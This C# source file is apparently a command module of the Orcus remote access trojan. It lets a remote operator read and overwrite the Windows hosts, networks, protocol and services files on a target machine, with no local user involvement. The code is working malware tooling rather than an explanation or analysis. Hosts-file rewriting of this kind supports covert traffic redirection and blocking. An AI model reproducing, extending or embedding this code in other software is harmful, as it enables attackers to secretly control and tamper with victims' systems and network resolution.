using System;
using System.IO;
using System.Text;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowsDrivers;

namespace Orcus.Commands.WindowsDrivers
{
    public class WindowsDriversCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((WindowsDriversCommunication) parameter[0])
            {
                case WindowsDriversCommunication.GetDriversFile:
                    var driversFile = (WindowsDriversFile) parameter[1];
                    SendDriverFile(driversFile, connectionInfo);
                    break;
                case WindowsDriversCommunication.GetAllDriversFiles:
                    foreach (WindowsDriversFile windowsDriversFile in Enum.GetValues(typeof(WindowsDriversFile)))
                        SendDriverFile(windowsDriversFile, connectionInfo);
                    break;
                case WindowsDriversCommunication.ChangeDriversFile:
                    try
                    {
                        var path = GetDriversFilePath((WindowsDriversFile) parameter[1]);
                        var newContent = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
                        File.WriteAllText(path, newContent, Encoding.UTF8);

                        ResponseByte((byte) WindowsDriversCommunication.ResponseChangedSuccessfully, connectionInfo);
                    }
                    catch (Exception e)
                    {
                        ResponseBytes((byte) WindowsDriversCommunication.ResponseChangingFailed,
                            Encoding.UTF8.GetBytes(e.Message), connectionInfo);
                    }
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private string GetDriversFilePath(WindowsDriversFile windowsDriversFile)
        {
            string name;

            switch (windowsDriversFile)
            {
                case WindowsDriversFile.Hosts:
                    name = "hosts";
                    break;
                case WindowsDriversFile.Networks:
                    name = "networks";
                    break;
                case WindowsDriversFile.Protocol:
                    name = "protocol";
                    break;
                case WindowsDriversFile.Services:
                    name = "services";
                    break;
                default:
                    throw new ArgumentOutOfRangeException(nameof(windowsDriversFile), windowsDriversFile, null);
            }

            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
                "drivers\\etc\\" + name);
        }

        private void SendDriverFile(WindowsDriversFile windowsDriversFile, IConnectionInfo connectionInfo)
        {
            var content = ReadDriversFile(windowsDriversFile);
            var contentData = Encoding.UTF8.GetBytes(content);

            var response = new byte[contentData.Length + 2];
            response[0] = (byte)WindowsDriversCommunication.ResponseDriversFileContent;
            response[1] = (byte)windowsDriversFile;
            Buffer.BlockCopy(contentData, 0, response, 2, contentData.Length);

            connectionInfo.CommandResponse(this, response);
        }

        private string ReadDriversFile(WindowsDriversFile windowsDriversFile)
        {
            var file = new FileInfo(GetDriversFilePath(windowsDriversFile));
            if (!file.Exists)
                return $"# FILE NOT FOUND: {file.FullName}\r\n#Saving will result in creating the file";

            using (var fileStream = new FileStream(file.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            using (var streamReader = new StreamReader(fileStream))
                return streamReader.ReadToEnd();
        }

        protected override uint GetId()
        {
            return 9;
        }
    }
}